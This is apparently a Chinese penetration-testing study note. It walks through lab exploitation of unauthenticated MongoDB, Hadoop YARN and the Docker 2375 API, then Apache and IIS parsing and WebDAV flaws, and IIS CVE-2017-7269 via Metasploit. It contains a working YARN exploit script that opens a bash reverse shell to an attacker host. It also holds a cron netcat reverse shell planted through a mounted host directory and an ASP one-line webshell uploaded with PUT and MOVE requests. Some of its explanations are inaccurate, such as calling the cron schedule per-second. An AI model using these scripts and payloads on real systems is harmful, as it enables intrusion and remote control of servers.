1. **配置 MongoDB 仓库**：

   MongoDB 提供了一个官方的 YUM 仓库。首先需要创建一个 `/etc/yum.repos.d/mongodb-org.repo` 文件来添加这个仓库。

   ```bash
   sudo vim /etc/yum.repos.d/mongodb-org.repo
   ```

   文件内容：

   ```ini
   [mongodb-org-4.4]
   name=MongoDB Repository
   baseurl=https://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/4.4/x86_64/
   gpgcheck=1
   enabled=1
   gpgkey=https://www.mongodb.org/static/pgp/server-4.4.asc
   ```

2. **安装 MongoDB**：

   使用 `yum` 来安装 MongoDB。

   ```bash
   sudo yum install -y mongodb-org
   ```

3. **启动 MongoDB**：

   ```bash
   sudo systemctl start mongod
   
   #设置 MongoDB 开机自启：
   sudo systemctl enable mongod
   ```

   

4. **验证安装**：

   ​	运行 `mongo` 命令进入 MongoDB 的交互式 shell 。

   ```bash
   mongo
   ```

5. **配置防火墙**：

   ​	从外部访问 MongoDB，需要在防火墙中开放 27017 端口。

   ```bash
   sudo firewall-cmd --permanent --add-port=27017/tcp
   sudo firewall-cmd --reload
   ```

**日志错误信息**

```bash
"msg":"Failed to unlink socket file","attr":{"path":"/tmp/mongodb-27017.sock","error":"Permission denied"}
```

**解决方案**

​	其原因在于 MongoDB 没有足够的权限来操作 `/tmp/mongodb-27017.sock` 文件。以下有两种解决方案：

```bash
chown mongodb:mongodb /tmp/mongodb-27017.sock
```

```bash
rm /tmp/mongodb-27017.sock
```



#### 常用命令

连接

* 使用默认端口来连接 MongoDB 的服务。

```bash
mongodb://localhost
```

* 使用用户名admin，密码adm登录localhost的admin数据库。

```bash
mongodb://admin:adm@localhost
```

* 通过 shell 连接 MongoDB 服务：

```bash
$ ./mongo
MongoDB shell version: 4.0.9
connecting to: test
... 
```

数据库操作

```mysql
# 创建数据库
use <database_name>
db
show dbs
db.dropDatabase()
```

集合

```mysql
db.createCollection('name'{ capped : true, autoIndexId : true, size : 
   6142800, max : 10000 } )
show tables
db.name.insert({"passwd":"123456"})
db.name.drop()
```

#### 未授权

靶机：

启动进程

sudo systemctl start mongod
如果您在启动mongod时收到类似于以下内容的错误：

Failed to start mongod.service: Unit mongod.service not found.
首先运行以下命令：然后再次运行上面的开始命令，然后再次运行上面的开始命令。

sudo systemctl daemon-reload

黑客机：

Nmap探测：`nmap -p 27017 --script mongodb-info <ip>`

使用命令进行连接

mongo --host 目标IP --port 目标端口

查看版本

![img](https://img-blog.csdnimg.cn/cd151754df00452b906e8fe2d1d84ac9.png)

查看用户、数据库信息等

![3c199f32728d84dfbc052f1c564adbed.png](https://img-blog.csdnimg.cn/img_convert/3c199f32728d84dfbc052f1c564adbed.png)

创建系统用户管理员创建一个用户名为myUserAdmin，密码为Passw0rd的系统用户管理员账号

```shell
#切换到admin库：

> use admin
> switched to db admin


#创建用户

> db.createUser(
 {
 user: "myUserAdmin",
 pwd: "Passw0rd",
 roles: [ { role: "userAdminAnyDatabase", db: "admin" } ]
 }
 )


#创建成功后提示信息：Successfully added user: {
    "user" : "myUserAdmin",
    "roles" : [
        {
            "role" : "userAdminAnyDatabase",
            "db" : "admin"
        }
    ]
}
```

5.ssh直接登录系统，利用完毕。

#### 防御

添加身份认证

```mysql
show users;
db.createUser(
  {
    user: "user",
    pwd: "pwd",
    roles: [ { role: "userAdminAnyDatabase", db: "admin" } ]
		//此角色允许在任何数据库上执行用户管理相关的操作（例如：创建、删除用户等）。
  }
);
db.getName();
db.getMongo();
```

```ini
security:  
	authorization: enabled
```

`mongo -u user -p pwd --authenticationDatabase admin`

绑定IP地址



### hadoop

互联网搜索引擎，需要存储大量的网页，并不断优化自己的搜索算法，提升搜索效率

#### **分布式与集群**

- **分布式系统:**

计算任务被分解为多个小的、可以并行处理的任务，然后分发到多台机器上并行执行。这些机器可能分布在全球各地，且系统的一部分可能不知道其他部分的存在。

- **集群**:

 	可以看作一组紧密连接的计算机，它们共同工作并被视为单一系统。集群中的所有节点通常都在同-地理位置，并通过高速局域网连接

​	Google 三驾马车:GFS、大表(Big Tables)、Mapreduce

​	Hadoop（Dougo Cutting）：HDFS，HBase，Mapreduce

#### **HDFS组件**

namenods

​	存储元数据，如文件和目录的结构、文件与块之间的映射、块与DataNode之间的映射等

datanode

​	存储和管理数据块，并定期向NameNode发送心跳和块报告

#### YARN

基于REST的web服务的URI语法如下

```
http://{http address of service}/ws/{version]/{resourcepath}
```

**http address of servicel:** 

​	该服务的http地址获取有关信息，目前支持的有ResourceManager和NodeManager，MapReduce应用程序和历史记录服务
**version:**

API的版本，如在hadoop2.7.2中api的版本号为v1

**resourcepath:**

他定义了一个单例资源或资源集合路径

**resourcemanager**
	管理集群上资源的调度与分配
**nodemanager**
	负责单个节点上的容器的启动、监视和报告

#### 未授权访问

​	YARN的REST API在端口8088和8090提供，其中8088默认对外开放并无任何认证，攻击者可以通过远程访问出造并发送特定的请求部署任务来执行任意命令，最终可以完全控制集群中的所有机器。

未授权访问测试 访问 http://192.168.18.129:8088/cluster 

##### 环境搭建

1. `'application-id': app_id`: 为应用程序指定一个唯一的ID。
2. `'application-name': 'get-shell'`: 为应用程序指定的名称。
3. `'am-container-spec'`: 指定应用主机(Application Master, AM)的容器规格。在YARN中，每个应用程序都有一个AM，负责与ResourceManager通信以获取资源。
   - `'commands': {'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,}`: 这是在AM容器启动时执行的命令。在这个例子中，它试图执行一个bash命令，从而创建一个反向shell连接到攻击者的主机。
4. `'application-type': 'YARN'`: 这是指定应用程序的类型。这里是YARN，可能表示这是一个原生的YARN应用。

**通过REST API命令执⾏** 

利⽤过程： 

监听端⼝ >> 创建Application >> 调⽤Submit Application API提交 

目标靶机：

​	在hadoop目录下	docker-compose build && docker-compose up -d #编译并启动环境

黑客机：

​	访问 http://靶机ip:8088/cluster 

​	本地监听9999端⼝ ：nc -lvnp 9999

目标靶机：

​	靶机利用文件exploit.py: 

```bash
#!/usr/bin/env python 

import requests 

target = 'http://192.168.18.129:8088/' 

lhost = '192.168.18.138' # put your local host ip here, and listen at port 9999 

url = target + 'ws/v1/cluster/apps/new-application' 

resp = requests.post(url) 

app_id = resp.json()['application-id'] 

url = target + 'ws/v1/cluster/apps' 

data = { 

​			'application-id': app_id, 

​			'application-name': 'get-shell',

​			 'am-container-spec': {

​					'commands': { 

​							'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,

​					 }, 

​			},

​			 'application-type': 'YARN', 

} 

requests.post(url, json=data)
```

​	启动exploit.py  命令:	python exploit.py

反弹成功

### docker(2375)

**漏洞简介以及危害**

  Docker 是⼀个开源的引擎可以轻松地为任何应⽤创建⼀个轻量级的、可移植的、⾃给⾃⾜的容 器。开发者在笔记本上编译测试通过的容器可以批量地在⽣产环境中部署包括 VMs、bare metal、 OpenStack 集群和其他的基础应⽤平台Docker。  Docker Remote API 是⼀个取代远程命令⾏界⾯（rcli）的REST API。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过 这个接⼝，我们可以新建 container，删除已有 container，甚⾄是获取宿主机的 shell。

yum install docker docker-compose	

mkdir docker

cd docker

**基础命令**：

systemctl start docker	`# 启动docker`

systemctl daemon-reload	`#重新加载Docker守护程序的配置。`

docker-compose build	`#用于构建Docker镜像`

docker-compose up -d	`#启动容器`

docker-compose up --build -d 

docker ps		`#列出正在运行的容器`

​					-a	`#列出所有容器，包括正在运行的和未运行的`

docker images		`#列出所有可用镜像`

删除docker：docker stop `容器id`

​						docker rm `容器id`			`#先停止容器再删除容器`

docker exec -it `容器id` /bin/sh	`# 进入docker容器		-t参数表示为容器重新分配一个伪输入终端。这意味着容器将模拟一个终端环境，使得用户可以与容器进行交互。通常，-t参数会与-i（表示交互式会话）参数一起使用。`

docker run -id -v /var/spool/cron:/tmp alpine:latest	

`-id：创建并在后台运行一个容器	-v /var/spool/cron:/tmp：将宿主机的/var/spool/cron/目录挂载到Docker容器内的/tmp/目录		alpine:latest----新建容器所要使用的镜像`

`docker pull <镜像名称>`

**docker漏洞利用：**

**靶机：**

docker exec -it `容器id` /bin/sh	`# 进入docker容器`

/# docker run -id -v /var/spool/cron:/tmp alpine:latest

```
这里是在容器里又创建并运行了一个Docker容器，并给它分配一个唯一的ID。

具体来说，`docker run`命令会根据指定的镜像创建一个新的容器，并在该容器中启动一个命令。`-id`选项是`docker run`命令的常用选项之一，其中`-i`表示在交互式终端下运行容器，`-d`表示在后台运行容器。

在这个命令中，`alpine:latest`是Docker镜像的名称和标签，表示要使用最新版本的`alpine`镜像。这个命令将在本地主机上创建一个新的容器，并从`alpine`镜像启动一个新的交互式终端。容器的唯一ID将由Docker自动分配。

可以通过`docker ps -a`命令查看所有的Docker容器，包括正在运行和已经停止的容器，并通过容器的ID来访问和操作它。

-v /var/spool/cron:/tmp：将宿主机的`/var/spool/cron/`目录挂载到Docker容器内的`/tmp/`目录

/var/spool/cron/：
`/var/spool/cron/`是Linux系统中保存计划任务（cron jobs）的目录。cron是Unix系统中常用的任务调度程序，用户可以按照一定的时间间隔定期运行指定的命令或脚本。

`/var/spool/cron/`目录下存储了系统上所有用户的cron任务文件，每个用户都有一个对应的目录，以该用户的用户名命名。在该目录下，存储了用户的cron任务文件，每个文件以该文件的名称命名，扩展名为`.crontab`。

每个cron任务文件（`.crontab`）包含了要定期运行的命令或脚本，以及它们运行的时间和频率等信息。通过挂载宿主机的`/var/spool/cron/`目录到Docker容器的`/tmp/`目录，Docker容器可以访问和读取宿主机上的cron任务文件，并且可以修改容器内的相应文件，从而在容器内创建、修改或删除cron任务。
```

/# docker ps    

/# docker exec -it (alpine的id) /bin/sh		`# 进入第二层容器`

/# echo ‘* * * * * /usr/bin/nc 192.168.10.** 9999 -e /bin/sh’ >> /tmp/root

```shell
这是一个Shell命令的字符串，其中包含了一些特殊的字符和命令。下面是对这个命令的解释：

* `echo` 是一个用于输出字符串或变量的命令。
* `‘* * * * *’` 是一个星号字符的字符串，表示每秒执行一次的计划任务。
* `/usr/bin/nc` 是一个网络工具，用于建立网络连接和执行其他网络操作。
* `192.168.10.**` 是一个IP地址，表示要连接的目标主机的IP地址。这里使用了通配符`*`来表示要连接的是192.168.10开头的任意IP地址。
* `9999` 是目标主机的端口号，表示要通过该端口建立连接。
* `-e /bin/sh` 是执行一个Shell命令，这里执行的是`/bin/sh`，即一个默认的Shell解释器。
* `>> /tmp/root` 表示将输出的结果追加到`/tmp/root`文件。

综合以上解释，这个命令的作用是创建一个计划任务，每秒执行一次，通过`nc`命令连接到192.168.10开头的任意IP地址的9999端口，并执行Shell命令`/bin/sh`，并将输出结果追加到`/tmp/root`文件中。这可能是一个网络攻击的命令，通过建立连接并执行Shell命令来获取目标主机的控制权。
```

/# cat /tmp/root

/# exit

/# vi /var/spool/cron/root



**kali攻击机:**

开启docker:systemctl start docker

docker version

docker -H tcp://`靶机ip`:2375 version

```shell
这个命令是使用Docker客户端来连接到指定的Docker daemon并获取版本信息。

解释如下：

* `docker` 是Docker命令行客户端的命令。
* `-H` 是一个选项，用于指定Docker daemon的地址。这里指定的是`http://`靶机ip`:2375`，表示使用TCP协议连接到IP地址为`靶机ip`，端口号为2375的Docker daemon。
* `version` 是Docker命令行客户端的子命令，用于获取Docker的版本信息。

因此，这个命令的作用是获取连接到指定Docker daemon的Docker版本信息。
```

docker -H tcp://`靶机ip`:2375 run -id -v /etc/crontabs:/tmp/ alpine:latest

```
因此，这个命令的作用是创建一个新的Docker容器，并将宿主机的/etc/crontabs目录挂载到容器的/tmp/crontabs目录，同时使用最新版本的Alpine Linux镜像作为容器的操作系统。
```

docker -H tcp://`靶机ip`:2375 exec -it `容器id` /bin/sh

```
在指定的Docker容器内执行/bin/sh命令，以打开一个交互式的Shell，以便进行命令行操作。
```

​    /# cat /etc/os-release

```
在Linux系统中，/etc/os-release文件包含了关于操作系统的各种信息，比如发行版名称、版本号、ID、发行代号等。通过这个命令，我们可以查看这些信息。
```

​    /# cat /tmp/root

## 12. 中间件漏洞

[中间件漏洞汇总](https://blog.csdn.net/weixin_44288604/article/details/121568508?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169271231216800180649535%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169271231216800180649535&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-121568508-null-null.142^v93^chatsearchT3_1&utm_term=%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187)

### Apache

**apache目录结构**

- bin：存放常用命令工具，如httpd
- cgi-bin：存放linux下常用命令，如xxx.sh
- error：错误记录
- htdocs：网站源码
- icons：网站图标
- manual：手册
- modules：扩展模块

#### 解析漏洞

##### 多后缀名解析(未知扩展名解析漏洞)

apache_parsing_vulnerability Apache HTTPD 多后缀解析漏洞

###### 漏洞介绍（原理）

​	Apache默认一个文件可以有多个以点（ . ）分隔的后缀，当最右边的后缀无法识别（不在mime.types内）, 则继续向左识别。那么哪些后缀Apache不认识？不在mime.types 里面的都不认识

1. 使用module模式与php结合的所有版本apache存在未知扩展名解析漏洞。
2. 使用fastcgi模式与php结合的所有版本apache不存在此漏洞。
3. 利用此漏洞时必须保证扩展名中至少带有一个.php，不然将默认作为txt/html文档处理

###### 漏洞复现

**1. 环境搭建**

​	Vulhub 是一个用于学习和测试漏洞的开源项目， 利用 Docker 容器化技术为安全研究、渗透测试人员提供了各种不同的虚拟环境，每个环境都模拟了一个或多个特定的漏洞场景进行实践。

​	Git 是一个分布式版本控制系统，由 Linus Torvalds 在 2005 年为 Linux 内核开发而创建，用于帮助多个开发者协同工作。我们使用 git 的克隆功能将远程仓库（vulhub）下载到本地。

```bash
# 安装git
yum install git
# 克隆vulhub到本地
git clone https://github.com/vulhub/vulhub.git
# 拉取镜像并启动靶场
cd ./vulhub/httpd/apache_parsing_vulnerability
docker-compose up -d
```

**2. 漏洞利用**

​	实战中可以上传rar，owf等文件进行利用，如果上传phpinfo.php.jpg，即使文件名中有.php，也会直接解析为jpg。因为Apache认识.jpg,停止继续向左识别。	

​	上传一个后缀名为 jpeg 的php文件

![image-20230820225106967](C:\Users\26216\Desktop\assets\image-20230820225106967.png)

###### 漏洞修复

​	根据主配置文件中

​		IncludeOptional conf-enabled/*.conf

​	确定其他配置文件路径，在 /etc/apache2/conf-enabled/docker-php.conf 中发现配置

```shell
AddType application/x-httpd-php .php

DirectoryIndex disabled
DirectoryIndex index.php index.html

<Directory /var/www/>
    Options -Indexes
    AllowOverride All
```

**防御手段**

1. 通过正则方式来对其进行限制

​	在配置文件中添加如下内容，匹配样式为 .php. 的文件并拒绝访问

```shell
<FilesMatch "\.php\.">
	require all denied
</FilesMatch>
```

2. 将原本的 AddHandler application/x-httpd-php .php 注释，利用正则表达式单独为.php的文件添加处理程序

```shell
<FilesMatch ".+.php$">
	SetHandler application/x-httpd-php
</FilesMatch>
```

##### 换行解析漏洞

Apache HTTPD 换行解析漏洞（CVE-2017-15715）

###### 漏洞介绍

​	**漏洞成因**：程序在解析PHP时，如果文件名最后有一个换行符`%0A`，apache依然会将其当成php解析，但是在上传文件时可以成功的绕过黑名单。

​	**影响范围**：Apache 2.4.0-2.4.29 版本

​	**漏洞编号**：CVE-2017-15715

###### 漏洞复现

**1. 环境搭建**

```bash
# 启动靶场
cd ./vulhub/httpd/CVE-2017-15715
docker-compose up -d
```

**2. 漏洞利用**

使用内部靶场

1.打开环境

2.上传一个phpinfo的文件,并抓包

![在这里插入图片描述](https://img-blog.csdnimg.cn/0193a807bd5b42219e8989e38d9dfc9b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

3.直接上传是要失败滴

![在这里插入图片描述](https://img-blog.csdnimg.cn/4799a5b06b3f42c38e26b7fab293309e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

4.在test.php后面添加一个空格，然后通过16进制编辑，把空格改为0a

![在这里插入图片描述](https://img-blog.csdnimg.cn/8db0efb6ea1b42a2aaf95e3046d03751.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

![在这里插入图片描述](https://img-blog.csdnimg.cn/77f990125f82420193a4bad1a87682a7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

5.访问上传的文件，直接访问是要失败滴

![在这里插入图片描述](https://img-blog.csdnimg.cn/91331272bf9a4f99b54fa686f7d96fb1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

6.访问地址后面添加0a即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/50969a7732844d5d91ea72737e7790fd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

##### 目录穿越漏洞

Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）

Apache HTTP Server 2.4.50 路径穿越漏洞（CVE-2021-42013）



##### Apache SSI远程命令执行漏洞

ssi-rce

​	在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<!--#exec cmd="id”--> 语法执行任意命令。

参考链接:
https://httpd.apache.org/docs/2.4/howto/ssi.html
https://www.w3.org/Jigsaw/Doc/User/SSl.html

###### 漏洞环境：

运行一个支持SSI与CGI的Apache服务器:

##### Apache HTTP Server 2.4.48 mod_proxy SSRF漏洞（CVE-2021-40438）

Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.48及以前的版本中，mod_proxy模块存在一处**逻辑错误**导致攻击者可以控制>反向代理服务器的地址，进而导致SSRF漏洞。

参考链接：

- https://httpd.apache.org/security/vulnerabilities_24.html

- https://firzen.de/building-a-poc-for-cve-2021-40438

- https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html

   

### IIS 6.x

1. 目录解析(6.0)
   形式：[www.xxx.com/xx.asp/xx.jpg](http://www.xxx.com/xx.asp/xx.jpg)
   原理：服务器默认会把.asp，.asa目录下的文件都解析成asp文件。
2. 文件解析
   形式：[www.xxx.com/xx.asp;.jpg](http://www.xxx.com/xx.asp;.jpg)
   原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。
3. 解析文件类型
   IIS6.0默认的可执行文件除了asp还包含这三种 :/test.asa、/test.cer、/test.cdx

使用内部靶场 Windows Server 2003 Standard x64 Edition，以NAT模式运行，选择自动获取DNS、IP，修改物理机hosts配置文件，添加站点 upload.moonteam.com

#### PUT漏洞

##### 漏洞描述

IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。
版本：IIS 6.0

##### 漏洞复现

1.开启 WebDAV 和写权限

![在这里插入图片描述](https://img-blog.csdnimg.cn/9b5a2e49577944f8a9ea54da6826d5f4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

2.打开网站，抓个包

![在这里插入图片描述](https://img-blog.csdnimg.cn/d638960a35df4c8fbae6f1defe052d4a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

3.把数据包发送到重放模块，GET方法改为OPTIONS，查看网站支持哪些协议

我们要用到的PUT和MOVE方法，网站都支持。

![在这里插入图片描述](https://img-blog.csdnimg.cn/aefc374e36204d45b1ea8a06e3209e0c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

4.上传一句话木马

文件不能是asp后缀，否则会失败，可以上传txt格式的，然后借助MOVE方法改文件后缀

```shell
PUT /test.txt HTTP/1.1
Host: upload.moonteam.com
Content-Length: 23

<%eval request("cmd")%>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/9e486a1a8993471189d8b72e13fae6e0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

![在这里插入图片描述](https://img-blog.csdnimg.cn/ee14978d16874bdca1f2b17b7aaccc1f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

如果上传asp后缀的，会直接失败。
![在这里插入图片描述](https://img-blog.csdnimg.cn/e2f2df3e3edc4668b3a91b57f521083e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

5.修改后门文件的后缀

注意：请求包的最后是要有2个换行的，就是下面图片中的第4、5行

```
MOVE /test.txt HTTP/1.1
Host: upload.moonteam.com
Destination: http://upload.moonteam.com/text.asp  #(新文件名)


```

![在这里插入图片描述](https://img-blog.csdnimg.cn/8fc20acfb227452ea784a82f7c71e0eb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

6.连接菜刀

![在这里插入图片描述](https://img-blog.csdnimg.cn/945b50e893924c86ad339c94e189acfe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

![在这里插入图片描述](https://img-blog.csdnimg.cn/aef94a1052c941488c3c43096bb9b1e5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

##### 防御方式

方法1：关闭webdav
![在这里插入图片描述](https://img-blog.csdnimg.cn/2353533e87cf4b4aa72bf6de36811431.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

![在这里插入图片描述](https://img-blog.csdnimg.cn/3d747c07722b4203a5f0db249b09e0d3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

方法2：关闭写入权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/a50803adda5e42ce8ff20c705e51a32b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

![在这里插入图片描述](https://img-blog.csdnimg.cn/72a273e4a4c84ab7b2d415a6880d7528.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

### cve_2017_7269漏洞

msfconsole

msf6 > use exploit/windows/iis/cve_2017_7269	#利用win2003的iis服务的cve_2017_7269漏洞

msf6 exploit(windows/iis/cve_2017_7269) > show options	#它显示了当前选择的模块选项、有效载荷选项以及攻击目标。

![image-20230825115147604](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230825115147604.png)

msf6 exploit(windows/iis/cve_2017_7269) > set RHOST 192.168.179.15	#RHOST为目标靶机，设置RHOST为靶机ip地址

```shell
   1. **Module选项**
      - `HttpHost`: 目标的主机名，当前设置为 "localhost"。这是攻击的目标服务器。
      - `PhysicalPathLength`: 目标物理路径的长度，当前设置为19。这可能是目标服务器上特定文件或目录的物理路径长度。
      - `RHOSTS`: 目标主机，当前没有设置。这是被攻击的主机，可以是单个主机名，也可以是一个用空格分隔的主机列表。详情请参见Metasploit文档。
      - `RPORT`: 目标端口，当前设置为80。这是被攻击主机的TCP端口。
   2. **有效载荷选项**
      - `EXITFUNC`: 退出技术，当前设置为 "process"。这定义了Meterpreter（一种由Metasploit实现的反向TCP shell）在完成其任务后应如何退出。
      - `LHOST`: 监听地址，当前设置为 "192.168.179.128"。这是攻击主机（也就是Meterpreter将连接到的主机）的IP地址。
      - `LPORT`: 监听端口，当前设置为4444。这是攻击主机将监听的端口。
   3. **攻击目标**
      - 目标ID为0的操作系统是 "Microsoft Windows Server 2003 R2"。这是攻击将针对的操作系统版本。
```

   

msf6 exploit(windows/iis/cve_2017_7269) > run		#开始渗透

meterpreter > shell		#获取shell

![image-20230825115245154](C:\Users\16159\AppData\Roaming\Typora\typora-user-images\image-20230825115245154.png)

ok

这就进入到了靶机的终端页面，但是显示中文会乱码

chcp 65001命令会解决乱码，显示正常中文，但是输入之后会退出到meterpreter

### 畸形文件解析漏洞

#### 1.原理解释

IIS的处理原理是基于文件扩展名映射
当客户端发送一个请求时，IIS会根据请求的文件扩展名确定如何处理该请求.在默认情况下，IIS使用“MIME映射"来确定将特定扩展名的文件处理为何种MIME类型(Multipurpose Internet Mail Extensions) 。

MIME类型决定了服务器如何解释文件并返回给客户端

该版本默认将 `*.asp;.jpg` 此种格式的文件名，当成Asp解析。服务器默认不解析 ; 号及其后面的内容，相当于截断。iis除了会将asp解析成脚本执行文件之外，还会将 cer cdx asa扩展名解析成asp。这里举个例子，可以看到`.cdx`扩展名被解析成asp。
![在这里插入图片描述](https://img-blog.csdnimg.cn/29aed34a32d04c1391fadd7d5561e20e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAbGFpbndpdGg=,size_20,color_FFFFFF,t_70,g_se,x_16)

#### 漏洞复现

靶机开启win2003

黑客机访问靶机网站，抓包，开头使用OPTIONS看可以使用哪些命令；使用PUT上传文件1.txt，底部写一句话木马；再使用MOVE修改文件名，添加一行Destination: /1.asp;.txt；再登录网站访问1.asp;.txt的路径 ok















# 暴力破解

## 1. 暴力破解

### Burpsuite intruder模块

​	Burpsuite 提供了暴力破解的模块，其中包含了四种攻击类型：

1. Sniper（狙击手）：

   ​	针对==每一个== payload 位置使用==同一==字典==逐个==爆破。

2. Battering ram（撞击物）：

   ​	针对每一个 payload 位置==同时==使用同一字典爆破。

3. Pichfork（干草叉）：

   ​	为每一个payload位置指定一个字典，爆破时按照字典排序逐个进行

   例如：第一次逐个payload位置填入每一个字典的第一行进行爆破

4. Cluster bomb（集束炸弹）：

   ​	为每一个payload位置指定一个字典，爆破时先固定一个，再通过字典逐个尝试其他payload位置的值。

# 旁注、目录越权

## 旁注

------

在进行web站点架设的时候，很多时候由于成本等方面的原因，会在一个服务器上架设多个web站点，然后通过域名及端口对网站进行区分，使得可以通过不同域名访问到不同的web站点。

在对需要渗透的主域名无法完成的情况下，通过渗透同一个服务器的其他站点，拿到webshell或服务器权限，然后再渗透主域名

### **IP逆向查询：**

------

**可通过ping域名获取其相关IP地址，之后通过IP地址反查获取其旁注的域名。**

**通过以下网址对IP进行查询，可得出此IP绑定的域名地址有多少个：**

> [‍http://tool.chinaz.com/Same/](http://tool.chinaz.com/Same/)
>
> [‍http://dns.aizhan.com/](http://dns.aizhan.com/)
>
> [‍http://www.11best.com/ip/](http://www.11best.com/ip/)

## **目录越权：**

------

**通过一个网站的目录访问统一服务器下的其他网站的目录，一个网站被攻陷，全都被攻陷**

### 防御方法：

每个网站创建一个不同的账号

### windowns 步骤

1. 建立一个账号test，默认在 users 组
2. 将网站的身份验证和访问控制的匿名访问更换为test
3. 将IUSR删除，添加test用户
   需要注意的是，尽量不要同时给读取运行和写入权限，读写分离。
4. 如果要绝对的安全，可以将C盘的访问权限设置为仅管理员访问

# CDN绕过：

## **CDN的优势：**

1. 提高用户访问速率，优化用户使用体验。
2. 隐藏真实服务器的IP
3. 提供WAF功能
   目前很多CDN也提供了WAF的功能，我们的访问请求会先经过CDN节点的过滤，该过滤可对SQL注入、XSS、Webshell上传、命令注入、恶意扫描等攻击行为进行有效检测和拦截。CDN节点将认为无害的数据提交给真实的主机服务器。

### 判断是否有cdn

**要判断该域名是否存在CDN的情况，可以去在线CDN查询网站：**

> 全球ping测试：[https://wepcc.com](https://wepcc.com/)
> 多个地点ping服务器：[http://ping.chinaz.com](http://ping.chinaz.com/)
> 超级ping：[http://ping.aizhan.com](http://ping.aizhan.com/)

如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。
**如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了。**

### 如何验证是否是真实IP

**找到了真实IP之后，如何验证其真实性呢？**
最简单的验证方法是直接尝试用IP访问，看看响应的页面是不是和访问域名返回的一样
